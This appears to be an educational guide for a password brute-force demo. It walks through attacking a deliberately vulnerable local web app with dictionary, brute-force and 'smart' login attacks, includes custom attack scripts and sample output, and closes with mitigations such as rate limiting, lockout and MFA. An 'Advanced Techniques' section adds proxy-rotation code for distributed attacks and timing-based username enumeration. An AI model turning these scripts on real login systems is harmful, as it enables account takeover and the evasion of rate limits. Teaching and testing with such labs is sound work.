# Password Toolkit Demo Guide

## 🚨 IMPORTANT SECURITY NOTICE

**This demo is for educational purposes only!**

- ✅ **AUTHORIZED USE ONLY**: Only use this toolkit on systems you own or have explicit written permission to test
- ❌ **NEVER** use this on production systems or systems you don't own
- ❌ **NEVER** use this for malicious purposes
- ⚖️ **LEGAL RESPONSIBILITY**: You are responsible for complying with all applicable laws and regulations

---

## 📋 Table of Contents

1. [Overview](#overview)
2. [Setup Instructions](#setup-instructions)
3. [Demo Website](#demo-website)
4. [Brute Force Attack Methods](#brute-force-attack-methods)
5. [Step-by-Step Attack Guide](#step-by-step-attack-guide)
6. [Understanding the Results](#understanding-the-results)
7. [Security Analysis](#security-analysis)
8. [Mitigation Strategies](#mitigation-strategies)

---

## 🎯 Overview

This demo demonstrates how password brute force attacks work against vulnerable web applications. The toolkit includes:

- **Vulnerable Demo Website**: An intentionally insecure web application
- **Web Brute Force Tool**: Automated attack tool for web login forms
- **Multiple Attack Methods**: Dictionary attacks, brute force, and smart attacks
- **Real-time Monitoring**: Admin panel to observe attacks in progress

### What You'll Learn

- How brute force attacks work against web applications
- Common vulnerabilities that enable these attacks
- How to identify and exploit weak authentication systems
- Defensive measures to prevent brute force attacks

---

## 🛠️ Setup Instructions

### Prerequisites

- Python 3.7 or higher
- pip (Python package installer)
- Web browser

### Step 1: Install Dependencies

```bash
# Navigate to the demo directory
cd demo

# Install required packages
pip install -r requirements.txt
```

### Step 2: Start the Demo Website

```bash
# Start the vulnerable web application
python app.py
```

The website will be available at: `http://localhost:5000`

### Step 3: Verify Setup

1. Open your web browser and go to `http://localhost:5000`
2. You should see the demo login page
3. Try logging in with `admin` / `admin` to verify it works

---

## 🌐 Demo Website

### Available Demo Accounts

The demo website includes several intentionally weak accounts:

| Username | Password | Role |
|----------|----------|------|
| admin | admin | Administrator |
| user | password | Regular User |
| test | 123456 | Test Account |
| demo | demo | Demo Account |
| guest | guest | Guest Account |
| john | john123 | User Account |
| alice | alice | User Account |
| bob | qwerty | User Account |
| manager | manager | Manager Account |
| root | root | Root Account |

### Vulnerable Features

The demo website has several intentional vulnerabilities:

1. **Weak Passwords**: Simple, easily guessable passwords
2. **No Rate Limiting**: Unlimited login attempts allowed
3. **User Enumeration**: `/api/users` endpoint exposes valid usernames
4. **No Account Lockout**: Failed attempts don't lock accounts
5. **Predictable Responses**: Clear success/failure messages
6. **No CAPTCHA**: No protection against automated attacks

### API Endpoints

- `GET /api/users` - Lists all usernames and emails
- `GET /api/login-attempts` - Shows recent login attempts
- `POST /login` - Login endpoint (target for attacks)

---

## ⚔️ Brute Force Attack Methods

### 1. Dictionary Attack

Uses a predefined list of common passwords:

```python
# Common passwords used in dictionary attacks
passwords = [
    'password', '123456', 'admin', 'test', 'demo',
    'qwerty', 'letmein', 'welcome', 'password123'
]
```

### 2. Brute Force Attack

Systematically generates all possible password combinations:

```python
# Character sets for brute force
charset = string.ascii_lowercase + string.digits  # a-z, 0-9
min_length = 1
max_length = 4
```

### 3. Smart Attack

Combines common usernames with common passwords and variations:

```python
# Smart attack uses intelligence about common patterns
usernames = ['admin', 'user', 'test', 'demo']
passwords = ['password', '123456', 'admin'] + username_variations
```

---

## 📖 Step-by-Step Attack Guide

### Method 1: Using the Web Brute Force Tool

#### Step 1: Start the Demo Website

```bash
# Terminal 1: Start the vulnerable website
cd demo
python app.py
```

#### Step 2: Run the Brute Force Attack

```bash
# Terminal 2: Run the web brute force tool
cd demo
python brute_force_web.py
```

#### Step 3: Monitor the Attack

1. Open the admin panel: `http://localhost:5000/admin` (login as admin/admin)
2. Watch real-time login attempts
3. Observe successful and failed attempts

### Method 2: Manual Attack with Custom Scripts

#### Step 1: Create Custom Attack Script

```python
#!/usr/bin/env python3
"""
Custom Brute Force Attack Script
"""

from brute_force_web import WebBruteForceAttacker

# Initialize attacker
attacker = WebBruteForceAttacker("http://localhost:5000/login")

# Set rate limiting (be respectful)
attacker.set_rate_limit(0.1)  # 100ms between requests

# Define target credentials
usernames = ['admin', 'user', 'test']
passwords = ['admin', 'password', '123456', 'test']

# Progress callback
def show_progress(attempt, stats):
    if attempt['success']:
        print(f"✓ SUCCESS: {attempt['username']}:{attempt['password']}")
    elif stats['total_attempts'] % 10 == 0:
        print(f"Progress: {stats['total_attempts']} attempts")

attacker.set_progress_callback(show_progress)

# Perform dictionary attack
results = attacker.dictionary_attack(usernames, passwords)

# Display results
print(f"\nFound {len(results)} valid credentials:")
for result in results:
    print(f"  {result['username']}:{result['password']}")
```

#### Step 2: Run Custom Script

```bash
python custom_attack.py
```

### Method 3: Using the Original Toolkit

#### Step 1: Get User List

```bash
# Get list of valid usernames
curl http://localhost:5000/api/users
```

#### Step 2: Use Dictionary Attack Module

```python
# In Python shell or script
import sys
sys.path.append('../src')

from dictionary_attack import DictionaryAttacker
import requests

# Load wordlist
attacker = DictionaryAttacker()
attacker.load_wordlist('../wordlists/common_passwords.txt', max_words=1000)

# Test against web endpoint (manual implementation needed)
# This demonstrates the concept - actual web integration requires
# custom code like our brute_force_web.py
```

---

## 📊 Understanding the Results

### Attack Output

When running attacks, you'll see output like:

```
Starting dictionary attack...
Usernames: 3
Passwords: 10
Total combinations: 30
Target: http://localhost:5000/login
Rate limit: 0.1s between requests
--------------------------------------------------

✓ SUCCESS: admin:admin
✓ SUCCESS: user:password
✓ SUCCESS: test:123456

==================================================
ATTACK COMPLETED
==================================================
Total attempts: 30
Successful logins: 3
Failed attempts: 27
Duration: 3.45 seconds
Rate: 8.70 attempts/second

✓ SUCCESSFUL CREDENTIALS:
  admin:admin
  user:password
  test:123456
```

### Admin Panel Monitoring

The admin panel (`http://localhost:5000/admin`) shows:

1. **Real-time Statistics**:
   - Total users in system
   - Total login attempts
   - Successful vs failed logins

2. **Live Attack Feed**:
   - Timestamp of each attempt
   - Username tried
   - Password attempted
   - Success/failure status
   - Source IP address

3. **Attack Patterns**:
   - Sequential password attempts
   - Multiple usernames being tested
   - Rate of attack attempts

---

## 🔍 Security Analysis

### Why These Attacks Succeed

1. **Weak Password Policy**:
   - No minimum length requirements
   - No complexity requirements
   - Common passwords allowed

2. **No Rate Limiting**:
   - Attackers can make unlimited attempts
   - No delays between failed attempts
   - No temporary account locks

3. **Information Disclosure**:
   - `/api/users` exposes valid usernames
   - Clear error messages help attackers
   - No obfuscation of user existence

4. **No Monitoring/Alerting**:
   - No alerts for suspicious activity
   - No logging of failed attempts
   - No automated response to attacks

### Attack Effectiveness

| Attack Type | Success Rate | Time Required | Detectability |
|-------------|--------------|---------------|---------------|
| Dictionary | High (90%+) | Minutes | Low |
| Smart Attack | Very High | Seconds | Very Low |
| Brute Force | Medium | Hours/Days | Medium |

---

## 🛡️ Mitigation Strategies

### 1. Strong Password Policies

```python
# Example password requirements
password_requirements = {
    'min_length': 12,
    'require_uppercase': True,
    'require_lowercase': True,
    'require_numbers': True,
    'require_symbols': True,
    'no_common_passwords': True,
    'no_personal_info': True
}
```

### 2. Rate Limiting

```python
# Example rate limiting implementation
from flask_limiter import Limiter

limiter = Limiter(
    app,
    key_func=lambda: request.remote_addr,
    default_limits=["5 per minute", "100 per hour"]
)

@app.route('/login', methods=['POST'])
@limiter.limit("3 per minute")
def login():
    # Login logic here
    pass
```

### 3. Account Lockout

```python
# Example account lockout logic
MAX_FAILED_ATTEMPTS = 5
LOCKOUT_DURATION = 300  # 5 minutes

def check_account_lockout(username):
    failed_attempts = get_failed_attempts(username)
    if failed_attempts >= MAX_FAILED_ATTEMPTS:
        last_attempt = get_last_failed_attempt(username)
        if time.time() - last_attempt < LOCKOUT_DURATION:
            return True  # Account locked
    return False
```

### 4. Multi-Factor Authentication

```python
# Example 2FA implementation
def verify_2fa(user, token):
    secret = get_user_2fa_secret(user)
    return pyotp.TOTP(secret).verify(token)
```

### 5. CAPTCHA Protection

```python
# Example CAPTCHA integration
from flask_recaptcha import ReCaptcha

recaptcha = ReCaptcha(app)

@app.route('/login', methods=['POST'])
def login():
    if not recaptcha.verify():
        return jsonify({'error': 'CAPTCHA verification failed'})
    # Continue with login logic
```

### 6. Monitoring and Alerting

```python
# Example monitoring implementation
def log_suspicious_activity(ip, username, attempts):
    if attempts > 10:  # Threshold for suspicious activity
        alert = {
            'type': 'brute_force_attempt',
            'ip': ip,
            'username': username,
            'attempts': attempts,
            'timestamp': datetime.now()
        }
        send_security_alert(alert)
```

---

## 🎓 Educational Takeaways

### For Security Professionals

1. **Vulnerability Assessment**: Learn to identify weak authentication systems
2. **Penetration Testing**: Understand how to test login security
3. **Risk Assessment**: Evaluate the impact of weak passwords
4. **Defense Planning**: Design comprehensive authentication security

### For Developers

1. **Secure Coding**: Implement proper authentication controls
2. **Security Testing**: Test applications against common attacks
3. **Monitoring**: Build logging and alerting into applications
4. **User Education**: Help users understand password security

### For System Administrators

1. **Policy Enforcement**: Implement and enforce strong password policies
2. **Monitoring**: Set up systems to detect brute force attacks
3. **Incident Response**: Develop procedures for handling security incidents
4. **User Training**: Educate users about security best practices

---

## 🔧 Advanced Techniques

### Custom Wordlist Generation

```python
# Generate custom wordlists based on target information
def generate_custom_wordlist(company_name, year):
    base_words = [company_name.lower(), str(year)]
    variations = []
    
    for word in base_words:
        variations.extend([
            word,
            word.capitalize(),
            word.upper(),
            word + '123',
            word + '!',
            '123' + word
        ])
    
    return variations
```

### Distributed Attacks

```python
# Example of coordinating multiple attack sources
class DistributedAttacker:
    def __init__(self, target_url, proxy_list):
        self.target_url = target_url
        self.proxies = proxy_list
        self.current_proxy = 0
    
    def get_next_proxy(self):
        proxy = self.proxies[self.current_proxy]
        self.current_proxy = (self.current_proxy + 1) % len(self.proxies)
        return proxy
    
    def attack_with_proxy_rotation(self, credentials):
        for username, password in credentials:
            proxy = self.get_next_proxy()
            # Perform attack using proxy
            self.attempt_login(username, password, proxy)
```

### Timing Analysis

```python
# Analyze response times to detect valid usernames
def timing_analysis_attack(usernames):
    timing_data = {}
    
    for username in usernames:
        start_time = time.time()
        response = attempt_login(username, 'invalid_password')
        end_time = time.time()
        
        timing_data[username] = end_time - start_time
    
    # Analyze timing differences
    avg_time = sum(timing_data.values()) / len(timing_data)
    potential_valid_users = [
        user for user, time_taken in timing_data.items()
        if time_taken > avg_time * 1.1  # 10% longer than average
    ]
    
    return potential_valid_users
```

---

## 📚 Additional Resources

### Documentation
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)

### Tools
- [Hydra](https://github.com/vanhauser-thc/thc-hydra) - Network login cracker
- [Medusa](http://foofus.net/goons/jmk/medusa/medusa.html) - Parallel brute force tool
- [Burp Suite](https://portswigger.net/burp) - Web application security testing

### Legal and Ethical Guidelines
- Always obtain written permission before testing
- Follow responsible disclosure practices
- Respect rate limits and system resources
- Document all testing activities

---

## ⚠️ Disclaimer

This toolkit is provided for educational purposes only. The authors are not responsible for any misuse of this software. Users must ensure they have proper authorization before testing any systems and must comply with all applicable laws and regulations.

**Remember: With great power comes great responsibility. Use this knowledge to build better, more secure systems.**